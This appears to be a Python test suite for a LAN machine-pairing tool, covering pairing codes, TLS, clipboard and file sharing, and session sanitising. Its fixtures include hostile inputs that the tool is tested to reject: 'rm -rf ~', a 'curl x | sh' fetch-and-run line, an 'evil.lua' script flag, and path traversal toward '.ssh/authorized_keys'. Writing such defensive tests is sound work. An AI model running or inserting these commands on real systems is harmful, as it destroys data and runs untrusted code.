"""peers.py (Machines): the pairing code, mDNS parsing, what is accepted from
another machine (names, ports, files, sessions rebuilt for this one), the
lan-mouse config and fingerprint, the shipped-off defaults; and two instances
end to end over loopback -- pairing with the code shown on both, mutual TLS,
a copy, a file, a secret refused, an unpaired certificate refused, plain
text refused, a capturing relay that sees no plain text, unpairing.

Hermetic: every instance lives in its own PEERS_HOME (config, keys,
privacy.conf), with PEERS_SINK=1 (what would reach the desktop goes to
effects.jsonl), PEERS_NO_MDNS=1 and 127.0.0.1 on free ports; no systemctl,
notify-send, wl-copy or avahi call is made."""
import atexit
import base64
import hashlib
import json
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import unittest

import helpers

_home = tempfile.mkdtemp(prefix="peers-unit-")
atexit.register(shutil.rmtree, _home, True)
os.environ["PEERS_HOME"] = _home
os.environ["PEERS_SINK"] = "1"
os.environ["PEERS_NO_MDNS"] = "1"
try:
    peers = helpers.import_script("peers.py")
finally:
    for var in ("PEERS_HOME", "PEERS_SINK", "PEERS_NO_MDNS"):
        os.environ.pop(var, None)
ps = helpers.import_script("privacy_settings.py")
SCRIPT = os.path.join(helpers.SCRIPTS, "peers.py")


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


class Defaults(unittest.TestCase):
    def test_ships_off(self):
        conf = peers.load(os.path.join(_home, "nothing.json"))
        self.assertFalse(conf["enabled"])
        self.assertFalse(conf["kvm"])
        self.assertEqual(conf["peers"], [])
        self.assertEqual(conf["context"], "ask")
        self.assertFalse(ps.machines_clipboard_on({}))
        self.assertFalse(ps.machines_memory_on({}))
        self.assertTrue(ps.machines_clipboard_on({"machines_clipboard": "on"}))

    def test_bad_values_fall_back(self):
        path = os.path.join(_home, "bad.json")
        with open(path, "w") as handle:
            json.dump({"enabled": "yes", "context": "always", "port": 80, "name": "../x",
                       "peers": [{"id": "zz", "cert": "x"}, "junk"]}, handle)
        conf = peers.load(path)
        self.assertFalse(conf["enabled"])
        self.assertEqual(conf["context"], "ask")
        self.assertEqual(conf["port"], peers.PORT)
        self.assertNotEqual(conf["name"], "../x")
        self.assertEqual(conf["peers"], [])

    def test_names(self):
        for good in ("laptop", "Ana's PC", "work-2", "café"):
            self.assertTrue(peers.valid_name(good), good)
        for bad in ("", " x", "a/b", "x" * 40, "-x", None, "a\nb"):
            self.assertFalse(peers.valid_name(bad), bad)


class Code(unittest.TestCase):
    def test_six_digits_and_binding(self):
        base = peers.transcript(b"host", b"joiner", b"h" * 32, b"j" * 32)
        code = peers.sas(base)
        self.assertRegex(code, r"^\d{3} \d{3}$")
        self.assertEqual(code, peers.sas(peers.transcript(b"host", b"joiner", b"h" * 32, b"j" * 32)))
        # Any other certificate or nonce makes another transcript (and so, almost always, another code).
        for other in (peers.transcript(b"mitm", b"joiner", b"h" * 32, b"j" * 32),
                      peers.transcript(b"host", b"mitm", b"h" * 32, b"j" * 32),
                      peers.transcript(b"host", b"joiner", b"x" * 32, b"j" * 32),
                      peers.transcript(b"host", b"joiner", b"h" * 32, b"x" * 32)):
            self.assertNotEqual(base, other)

    def test_identity_is_ed25519_and_private(self):
        d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, d, True)
        key, cert = os.path.join(d, "k"), os.path.join(d, "c")
        peers.make_identity(key, cert)
        self.assertEqual(os.stat(key).st_mode & 0o777, 0o600)
        with open(cert) as handle:
            peers.ed25519_public(handle.read())
        with self.assertRaises(FileExistsError):     # a key is never overwritten
            peers.make_identity(key, cert)


class Network(unittest.TestCase):
    def test_parse_browse(self):
        out = ("+;enp7s0;IPv4;laptop\\032(ab12cd);_hyprdesk-peer._tcp;local\n"
               '=;enp7s0;IPv6;laptop\\032(ab12cd);_hyprdesk-peer._tcp;local;laptop.local;fe80::1;47615;'
               '"v=1" "name=laptop" "id=ab12cd34ef56ab78"\n'
               '=;enp7s0;IPv4;laptop\\032(ab12cd);_hyprdesk-peer._tcp;local;laptop.local;192.168.0.12;47615;'
               '"v=1" "name=laptop" "id=ab12cd34ef56ab78"\n'
               '=;enp7s0;IPv4;junk;_hyprdesk-peer._tcp;local;x.local;192.168.0.13;47615;"id=nothex"\n')
        found = peers.parse_browse(out)
        self.assertEqual(found, [{"name": "laptop", "id": "ab12cd34ef56ab78", "address": "192.168.0.12",
                                  "port": 47615, "host": "laptop.local"}])

    def test_sender_fields(self):
        good = peers.sender_fields({"name": "laptop", "port": 47615, "kvm_fp": ":".join(["ab"] * 32),
                                    "kvm_port": 4242}, "10.0.0.2")
        self.assertEqual(good["port"], 47615)
        self.assertEqual(good["name"], "laptop")
        self.assertTrue(good["kvm_fp"])
        bad = peers.sender_fields({"name": "../../x", "port": 22, "kvm_fp": "zz"}, "10.0.0.2")
        self.assertEqual((bad["name"], bad["port"], bad["kvm_fp"]), (None, None, None))
        self.assertIsNone(peers.sender_fields("junk")["port"])

    def test_filenames(self):
        self.assertEqual(peers.clean_filename("../../.ssh/authorized_keys"), "authorized_keys")
        self.assertEqual(peers.clean_filename(".bashrc"), "bashrc")
        self.assertEqual(peers.clean_filename("C:\\x\\report.pdf"), "report.pdf")
        self.assertEqual(peers.clean_filename(""), "file")
        self.assertEqual(peers.clean_filename(None), "file")

    def test_find_peer(self):
        conf = {"peers": [{"id": "ab12" + "0" * 60, "name": "Laptop"}, {"id": "cd34" + "0" * 60, "name": "Desk"}]}
        self.assertEqual(peers.find_peer(conf, "laptop")["name"], "Laptop")
        self.assertEqual(peers.find_peer(conf, "CD34-0000")["name"], "Desk")
        self.assertIsNone(peers.find_peer(conf, "ab"))
        self.assertIsNone(peers.find_peer(conf, "nobody"))


class Sessions(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.dir, True)
        self.file = os.path.join(self.dir, "notes.txt")
        open(self.file, "w").close()
        self.index = {"ids": {"org.mozilla.firefox": {"id": "org.mozilla.firefox", "name": "Firefox"},
                              "code": {"id": "code", "name": "VS Code"}}}
        self._which = peers.shutil.which
        peers.shutil.which = lambda prog: f"/usr/bin/{prog}" if prog in ("kitty", "mpv") else None
        self.addCleanup(setattr, peers.shutil, "which", self._which)

    def test_rebuilt_for_this_machine(self):
        windows = [
            {"app": "Firefox", "launch": {"desktop": "org.mozilla.firefox"}, "workspace": "1"},
            {"app": "VS Code", "launch": {"desktop": "code", "args": [self.file, "/nowhere/else"]}},
            {"app": "Photoshop", "launch": {"desktop": "photoshop"}},
            {"app": "kitty", "launch": {"argv": ["kitty", "--directory", self.dir, "sh", "-c", "rm -rf ~"],
                                        "cwd": self.dir}},
            {"app": "kitty", "launch": {"argv": ["kitty", "--directory", "/not/here"], "cwd": "/not/here"}},
            {"app": "mpv", "launch": {"argv": ["mpv", "--start=40", "--script=evil.lua", self.file]}},
            {"app": "evil", "launch": {"argv": ["/bin/sh", "-c", "curl x | sh"]}},
            "junk",
        ]
        keep, dropped = peers.sanitize_session({"windows": windows}, self.index)
        launches = [r["launch"] for r in keep]
        self.assertIn({"desktop": "org.mozilla.firefox", "args": []}, launches)
        self.assertIn({"desktop": "code", "args": [self.file]}, launches)
        self.assertIn({"argv": ["kitty", "--directory", self.dir], "cwd": self.dir}, launches)
        self.assertIn({"argv": ["kitty", "--directory", peers.HOME], "cwd": peers.HOME}, launches)
        self.assertIn({"argv": ["mpv", "--start=40", self.file]}, launches)
        self.assertEqual(sorted(a for a, _ in dropped), ["Photoshop", "evil"])
        self.assertFalse(any("rm -rf" in json.dumps(r) or "curl" in json.dumps(r) for r in keep))

    def test_not_a_session(self):
        self.assertEqual(peers.sanitize_session(None, self.index), ([], []))
        self.assertEqual(peers.sanitize_session({"windows": "x"}, self.index), ([], []))


class Kvm(unittest.TestCase):
    def test_fingerprint_and_config(self):
        d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, d, True)
        key, cert = os.path.join(d, "k"), os.path.join(d, "c")
        peers.make_identity(key, cert)
        pem = open(key).read() + open(cert).read()        # lan-mouse keeps both in one file
        path = os.path.join(d, "lan-mouse.pem")
        with open(path, "w") as handle:
            handle.write(pem)
        der = base64.b64decode("".join(open(cert).read().split("-----")[2].split()))
        want = ":".join(f"{b:02x}" for b in hashlib.sha256(der).digest())
        self.assertEqual(peers.kvm_fingerprint(path), want)
        self.assertIsNone(peers.kvm_fingerprint(os.path.join(d, "none")))
        pid = "ab" * 32
        conf = {"peers": [{"id": pid, "name": "laptop", "kvm_side": "left"},
                          {"id": "cd" * 32, "name": "desk", "kvm_side": ""}]}
        text = peers.kvm_config(conf, {pid: {"kvm_fp": want, "host": "192.168.0.12", "kvm_port": 4242}})
        self.assertTrue(text.startswith(peers.KVM_HEADER))
        self.assertIn(f'"{want}" = "laptop"', text)
        self.assertIn('position = "left"', text)
        self.assertIn('ips = ["192.168.0.12"]', text)
        self.assertEqual(text.count("[[clients]]"), 1)     # desk: no side, no address


class ReviewFixes(unittest.TestCase):
    """What the review found: mapped addresses, recall argv, relative cwd,
    the master switch stopping the shared keyboard, the kvm config following
    seen.json."""

    def setUp(self):
        for path in (peers.CONF, peers.EFFECTS, peers.SEEN, peers.LANMOUSE_CONF):
            try:
                os.remove(path)
            except OSError:
                pass

    def effects(self, kind):
        try:
            with open(peers.EFFECTS) as handle:
                return [e for e in map(json.loads, handle) if e["kind"] == kind]
        except OSError:
            return []

    def test_mapped_ipv4_address(self):
        self.assertEqual(peers.plain_address("::ffff:192.168.0.12"), "192.168.0.12")
        self.assertEqual(peers.plain_address("192.168.0.12"), "192.168.0.12")
        self.assertEqual(peers.plain_address("fd00::5"), "fd00::5")

    def test_recall_question_is_never_a_flag(self):
        self.assertEqual(peers.recall_question("--notify"), "notify")
        self.assertEqual(peers.recall_question("-- what did I read"), "what did I read")
        self.assertEqual(peers.recall_question("what did I read"), "what did I read")
        self.assertEqual(peers.recall_question("---"), "?")

    def test_terminal_cwd_must_be_absolute(self):
        self._which = peers.shutil.which
        peers.shutil.which = lambda prog: "/usr/bin/kitty"
        self.addCleanup(setattr, peers.shutil, "which", self._which)
        launch, _ = peers.local_launch({"launch": {"argv": ["kitty"], "cwd": "."}}, {"ids": {}})
        self.assertEqual(launch["cwd"], peers.HOME)

    def _conf(self, **fields):
        conf = dict(peers.DEFAULTS, peers=[{"id": "ab" * 32, "name": "laptop", "cert": "x", "paired": 1,
                                            "kvm_side": "left"}], **fields)
        peers.write_json(peers.CONF, conf)

    def test_master_off_stops_the_shared_keyboard(self):
        self._conf(enabled=True, kvm=True)
        peers.set_option("enabled", "off")
        calls = [e["args"] for e in self.effects("systemctl")]
        self.assertIn(["disable", "--now", peers.KVM_UNIT], calls)
        self.assertTrue(peers.load()["kvm"])                    # the switch itself is kept
        with self.assertRaises(peers.PeerError):
            peers.kvm_set(True)                                 # not while everything is off

    def test_kvm_config_follows_seen(self):
        self._conf(enabled=True, kvm=True)
        conf = peers.load()
        peers.note_seen("ab" * 32, host="192.168.0.12")
        self.assertTrue(peers.write_kvm_config(conf))
        self.assertFalse(peers.write_kvm_config(conf))          # unchanged: not rewritten
        peers.note_seen("ab" * 32, kvm_fp=":".join(["cd"] * 32))
        self.assertTrue(peers.write_kvm_config(conf))           # what the daemon's loop now picks up
        with open(peers.LANMOUSE_CONF) as handle:
            self.assertIn(":".join(["cd"] * 32), handle.read())


def env_for(home, **extra):
    env = dict(os.environ, PEERS_HOME=home, PEERS_BIND="127.0.0.1", PEERS_NO_MDNS="1", PEERS_SINK="1")
    env.pop("WAYLAND_DISPLAY", None)
    env.update(extra)
    return env


class Loopback(unittest.TestCase):
    """Two machines on one computer: alpha and beta."""

    @classmethod
    def setUpClass(cls):
        cls.root = tempfile.mkdtemp(prefix="peers-e2e-")
        cls.a, cls.b = os.path.join(cls.root, "a"), os.path.join(cls.root, "b")
        cls.procs = []
        cls.ports = {cls.a: free_port(), cls.b: free_port()}
        for home, name in ((cls.a, "alpha"), (cls.b, "beta")):
            os.makedirs(home)
            cls.cli(home, "name", name)
            cls.cli(home, "set", "port", str(cls.ports[home]))
            with open(os.path.join(home, "privacy.conf"), "w") as handle:
                handle.write("machines_clipboard=on\n")
        pair_port = free_port()
        host = subprocess.Popen([sys.executable, SCRIPT, "pair", "--json", "--port", str(pair_port)],
                                env=env_for(cls.a), stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
        cls.procs.append(host)
        waiting = json.loads(host.stdout.readline())
        assert waiting["event"] == "waiting", waiting
        join = subprocess.Popen([sys.executable, SCRIPT, "join", f"127.0.0.1:{pair_port}", "--json"],
                                env=env_for(cls.b), stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
        cls.procs.append(join)
        cls.codes = (json.loads(host.stdout.readline()), json.loads(join.stdout.readline()))
        for p in (host, join):
            p.stdin.write("yes\n")
            p.stdin.flush()
        cls.paired = (host.wait(30), join.wait(30))
        for home in (cls.a, cls.b):
            log = open(os.path.join(home, "serve.log"), "w")
            cls.procs.append(subprocess.Popen([sys.executable, SCRIPT, "serve"], env=env_for(home), stdout=log,
                                              stderr=subprocess.STDOUT))
        for home in (cls.a, cls.b):
            deadline = time.time() + 10
            while time.time() < deadline:
                try:
                    socket.create_connection(("127.0.0.1", cls.ports[home]), timeout=1).close()
                    break
                except OSError:
                    time.sleep(0.1)

    @classmethod
    def tearDownClass(cls):
        for p in cls.procs:
            if p.poll() is None:
                p.terminate()
                try:
                    p.wait(5)
                except subprocess.TimeoutExpired:
                    p.kill()
        shutil.rmtree(cls.root, True)

    @classmethod
    def cli(cls, home, *args, stdin=None, **extra):
        return subprocess.run([sys.executable, SCRIPT, *args], env=env_for(home, **extra), input=stdin,
                              capture_output=True, text=True, timeout=60)

    def effects(self, home, kind):
        try:
            with open(os.path.join(home, "effects.jsonl")) as handle:
                return [e for e in map(json.loads, handle) if e["kind"] == kind]
        except OSError:
            return []

    def test_1_paired_with_the_same_code(self):
        host, join = self.codes
        self.assertEqual(host["event"], "code")
        self.assertEqual(host["code"], join["code"])
        self.assertEqual((host["peer"], join["peer"]), ("beta", "alpha"))
        self.assertEqual(self.paired, (0, 0))
        a = json.loads(self.cli(self.a, "status", "--json").stdout)
        self.assertTrue(a["enabled"])
        self.assertEqual([p["name"] for p in a["peers"]], ["beta"])

    def test_2_ping(self):
        out = json.loads(self.cli(self.b, "ping", "--json").stdout)
        self.assertTrue(out[0]["ok"], out)
        self.assertTrue(out[0]["accepts"]["clipboard"])
        self.assertFalse(out[0]["accepts"]["memory"])

    def test_3_clipboard(self):
        time.sleep(max(0, 2.2 - (time.time() - self.started)))     # the hook skips its parent's first 2 s
        text = "hola desde alpha: ¿qué tal?"
        self.cli(self.a, "clip-hook", stdin=text, CLIPBOARD_STATE="data")
        got = self.effects(self.b, "copy")
        self.assertTrue(got)
        self.assertEqual(got[-1]["digest"], hashlib.sha256(text.encode()).hexdigest())
        # The copy that came from alpha is not sent back by beta's hook.
        self.cli(self.b, "clip-hook", stdin=text, CLIPBOARD_STATE="data")
        self.assertEqual(self.effects(self.a, "copy"), [])
        # Secrets and password-manager copies never leave.
        before = len(self.effects(self.b, "copy"))
        self.cli(self.a, "clip-hook", stdin="password: hunter22", CLIPBOARD_STATE="data")
        self.cli(self.a, "clip-hook", stdin="nothing special", CLIPBOARD_STATE="sensitive")
        self.assertEqual(len(self.effects(self.b, "copy")), before)

    def test_4_file_and_secret_file(self):
        src = os.path.join(self.root, "photo.bin")
        with open(src, "wb") as handle:
            handle.write(os.urandom(200_000))
        self.assertEqual(self.cli(self.a, "send", src).returncode, 0)
        with open(os.path.join(self.b, "inbox", "photo.bin"), "rb") as got, open(src, "rb") as want:
            self.assertEqual(got.read(), want.read())
        secret = os.path.join(self.root, "prod.env")
        with open(secret, "w") as handle:
            handle.write("TOKEN=1\n")
        self.assertEqual(self.cli(self.a, "send", secret).returncode, 1)
        self.assertFalse(os.path.exists(os.path.join(self.b, "inbox", "prod.env")))

    def test_5_memory_needs_the_answering_side(self):
        self.assertEqual(self.cli(self.b, "recall", "--json", "what did I copy").returncode, 1)
        with open(os.path.join(self.a, "privacy.conf"), "a") as handle:
            handle.write("machines_memory=on\n")
        out = json.loads(self.cli(self.b, "recall", "--json", "what did I copy").stdout)
        self.assertTrue(out["ok"])

    def test_6_strangers_and_plain_text_refused(self):
        mallory = os.path.join(self.root, "m")
        os.makedirs(mallory)
        alpha = json.load(open(os.path.join(self.b, "peers.json")))["peers"][0]
        code = (f"import importlib.util as u; s = u.spec_from_file_location('p', {SCRIPT!r}); m = u.module_from_spec(s); "
                f"s.loader.exec_module(m); m.identity(); m.note_seen({alpha['id']!r}, host='127.0.0.1', "
                f"port={self.ports[self.a]})\ntry:\n    m.request({alpha!r}, {{'op': 'hello'}}); print('ANSWERED')\n"
                "except m.PeerError as e:\n    print('refused')")
        out = subprocess.run([sys.executable, "-c", code], env=env_for(mallory), capture_output=True, text=True,
                             timeout=30).stdout
        self.assertIn("refused", out)
        with socket.create_connection(("127.0.0.1", self.ports[self.a]), timeout=5) as s:
            s.sendall(b'{"op": "hello"}\n')
            try:
                answer = s.recv(200)
            except OSError:
                answer = b""
        self.assertNotIn(b"ok", answer)

    def test_7_nothing_readable_on_the_wire(self):
        captured = bytearray()
        relay = socket.socket()
        relay.bind(("127.0.0.1", 0))
        relay.listen()

        def pipe(src, dst):
            while True:
                try:
                    data = src.recv(65536)
                except OSError:
                    data = b""
                if not data:
                    try:
                        dst.shutdown(socket.SHUT_WR)
                    except OSError:
                        pass
                    return
                captured.extend(data)
                dst.sendall(data)

        def serve():
            conn, _ = relay.accept()
            up = socket.create_connection(("127.0.0.1", self.ports[self.b]))
            threading.Thread(target=pipe, args=(conn, up), daemon=True).start()
            pipe(up, conn)
        threading.Thread(target=serve, daemon=True).start()
        seen_path = os.path.join(self.a, "seen.json")
        seen = json.load(open(seen_path))
        pid = next(iter(seen))
        real = seen[pid]["port"]
        seen[pid]["port"] = relay.getsockname()[1]
        json.dump(seen, open(seen_path, "w"))
        try:
            canary = "CANARY-41-plain words here"
            self.cli(self.a, "clip-hook", stdin=canary, CLIPBOARD_STATE="data")
        finally:
            seen = json.load(open(seen_path))
            seen[pid]["port"] = real
            json.dump(seen, open(seen_path, "w"))
            relay.close()
        self.assertEqual(self.effects(self.b, "copy")[-1]["digest"], hashlib.sha256(canary.encode()).hexdigest())
        self.assertGreater(len(captured), 500)
        self.assertEqual(captured[0], 0x16)               # a TLS handshake record
        for word in (b"CANARY", b"plain words", b"clip", b"alpha"):
            self.assertNotIn(word, captured)

    def test_8_unpair_both_sides(self):
        out = self.cli(self.b, "unpair", "alpha")
        self.assertIn("forgot alpha", out.stdout)
        for home in (self.a, self.b):
            conf = json.load(open(os.path.join(home, "peers.json")))
            self.assertEqual(conf["peers"], [])
            self.assertFalse(conf["enabled"])
        deadline = time.time() + 8
        while time.time() < deadline and any(p.poll() is None for p in self.procs[-2:]):
            time.sleep(0.2)
        self.assertTrue(all(p.poll() == 0 for p in self.procs[-2:]))   # both daemons stopped by themselves


class PairRefused(unittest.TestCase):
    def test_one_no_pairs_nothing(self):
        root = tempfile.mkdtemp(prefix="peers-no-")
        self.addCleanup(shutil.rmtree, root, True)
        a, b = os.path.join(root, "a"), os.path.join(root, "b")
        port = free_port()
        host = subprocess.Popen([sys.executable, SCRIPT, "pair", "--json", "--port", str(port)], env=env_for(a),
                                stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
        self.assertEqual(json.loads(host.stdout.readline())["event"], "waiting")
        join = subprocess.Popen([sys.executable, SCRIPT, "join", f"127.0.0.1:{port}", "--json"], env=env_for(b),
                                stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
        codes = [json.loads(p.stdout.readline())["code"] for p in (host, join)]
        self.assertEqual(codes[0], codes[1])
        host.stdin.write("yes\n")
        host.stdin.flush()
        join.stdin.write("no\n")            # "they differ" on one machine
        join.stdin.flush()
        self.assertEqual((host.wait(30), join.wait(30)), (1, 1))
        for home in (a, b):
            self.assertEqual(peers.load(os.path.join(home, "peers.json"))["peers"], [])


class Page(unittest.TestCase):
    def test_texts(self):
        try:
            from settings_pages import machines as page        # needs GTK, not a display
        except Exception as exc:        # noqa: BLE001
            raise unittest.SkipTest(f"settings_pages.machines not importable: {exc}")
        now = 1_000_000
        self.assertEqual(page.seen_text({"seen": now - 125, "host": "192.168.0.12", "short": "AB12-CD34"}, now),
                         "seen 2 min ago at 192.168.0.12  ·  AB12-CD34")
        self.assertIn("not seen", page.seen_text({}, now))
        self.assertIn("no identity yet", page.machine_text({"peers": []}))
        self.assertIn("switched off", page.machine_text({"id": "X", "peers": [{}], "enabled": False}))
        self.assertIn("not installed", page.kvm_text({"installed": False, "pinned": "0.11.0"}))


Loopback.started = time.time()

if __name__ == "__main__":
    unittest.main()
